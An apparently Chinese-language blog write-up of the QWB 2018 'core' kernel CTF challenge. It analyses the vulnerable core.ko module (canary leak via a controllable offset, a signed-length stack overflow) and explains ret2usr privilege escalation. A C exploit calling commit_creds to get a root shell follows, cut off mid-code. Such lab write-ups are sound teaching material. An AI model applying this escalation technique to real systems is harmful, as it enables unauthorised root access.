        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Pwn-Kernel/">Pwn_Kernel</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于typora 编辑起来太卡了, 所以将基础部分已经迁移至《深入理解Pwn_Kernel基础篇》</p>
<h1 id="内核栈利用"><a href="#内核栈利用" class="headerlink" title="内核栈利用"></a>内核栈利用</h1><h2 id="QWB-2018-core"><a href="#QWB-2018-core" class="headerlink" title="QWB_2018_core"></a>QWB_2018_core</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><strong>start.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 128M \</span><br><span class="line">	-kernel ./bzImage \</span><br><span class="line">	-initrd  ./core.cpio \</span><br><span class="line">	-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">	-s \</span><br><span class="line">	-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">	-nographic  \</span><br></pre></td></tr></table></figure></div>

<p>开启了<code> kaslr</code>保护。</p>
<blockquote>
<p>如果自己编译的 qemu 可能会报错<code>network backend ‘user‘ is not compiled into this binary</code>，解决方法就是<code>sudo apt-get install libslirp-dev</code>，然后重新编译 <code>./configure --enable-slirp</code>。</p>
</blockquote>
<p><strong>init</strong></p>
<p>解压 core.cpio ，分析 init 文件：</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ <span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ <span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line">   9   │ <span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ <span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ poweroff -d 0 -f</span><br><span class="line">───────┴────────────────────────────</span><br></pre></td></tr></table></figure></div>

<ul>
<li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li>
<li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li>
<li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li>
<li>第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包</li>
</ul>
<p>里面还有一个 gen_cpio.sh 脚本，用于快速打包。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: gen_cpio.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ find . -print0 \</span><br><span class="line">   2   │ | cpio --null -ov --format=newc \</span><br><span class="line">   3   │ | gzip -9 &gt; <span class="variable">$1</span></span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure></div>

<p><strong>core.ko</strong></p>
<p>检查一下保护。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec core/core.ko</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/kernel/pwn/give_to_player/core/core.ko&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure></div>

<p>使用 IDA 继续分析.ko文件。</p>
<p><code>init_module()</code> 注册了 <code>/proc/core</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>exit_core()</code>删除 <code>/proc/core</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_ioctl()</code> 定义了三条命令，分别调用 <code>core_read(), core_copy_func()</code>和设置全局变量 <code>off</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_read()</code> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 <code>leak canary</code> 和一些地址 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_copy_func()</code> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 <code>qmemcpy</code> 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="comment">// 这里用的jg判断，为有符号判断，0xffffffffffff0000|(0x100) 会判定为负从而绕过。</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_write()</code> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 <code>ropchain</code> 了 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>关闭 <code>kaslr</code> 并将权限调到 <code>root</code>，通过 <code>add-symbol-file core.ko textaddr</code> 把 <code>core.ko</code> 符号加载进去。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex <span class="string">&quot;file <span class="subst">$(find . -name vmlinux)</span>&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;add-symbol-file <span class="subst">$(find . -name core.ko)</span> 0xffffffffc0000000&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;b *0xffffffffc000015f&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;c&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>exp 都很简单，很容易看懂，就不调试了。</p>
<h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由<code>system(&quot;/bin/sh&quot;)</code> 变为了 <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p>
<p><strong>状态保存</strong></p>
<p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要着陆回用户态以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要手动模拟用户态进入内核态的准备工作<strong>——</strong>保存各寄存器的值到内核栈上，以便于后续着陆回用户态。通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p>
<blockquote>
<p>算是一个通用的 pwn 板子。</p>
<p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>返回用户态</strong></p>
<p>由内核态返回用户态只需要：</p>
<ul>
<li><code>swapgs</code>指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。也用于恢复用户态 GS 寄存器。</li>
<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
</ul>
<p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p>
<p>执行 <code>iretq</code> 时的栈布局。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure></div>

<p>所以我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags <span class="comment">//64bit user_rflags</span></span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>在未开启 <code>SMAP/SMEP</code> 保护的情况下，用户空间无法访问内核空间的数据，但是内核空间可以访问 &#x2F; 执行用户空间的数据，因此 <code>ret2usr</code> 这种攻击手法应运而生，以内核的 ring 0 权限执行用户空间的代码以完成提权。<code>ret2user</code> 即返回到用户空间的提权代码上进行提权，之后返回用户态即为 root 权限。通常 CTF 中的 ret2usr 还是以执行<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权为主要的攻击手法，不过相比起构造冗长的 ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可。另外题目给的vmlinux用于提取gadget可以，但使用IDA分析时太慢，可以用vmlinux-to-elf解压bzImage进行分析。</p>
<ol>
<li>从 <code>/tmp/kallsyms</code> 读取符号地址，确认与<code>nokaslr</code>偏移，从<code>vmlinux</code>寻找<code>gadget</code>。</li>
<li>保存用户状态。</li>
<li>通过设置 off 读取 canary。</li>
<li>于内核态访问用户空间的 <code>commit_creds(prepare_kernel_cred(NULL))</code>提权。</li>
<li>通过 <code>swapgs; mov trap_frame, rsp; iretq</code> 返回用户空间，并执行 <code>system(&quot;/bin/sh&quot;);</code>。</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss, tf_addr = (<span class="type">size_t</span>) &amp;tf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    tf.user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    tf.user_cs = user_cs;</span><br><span class="line">    tf.user_rflags = user_rflags;</span><br><span class="line">    tf.user_sp = user_sp - <span class="number">0x1000</span>;</span><br><span class="line">    tf.user_ss = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    <span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsp, tf_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span 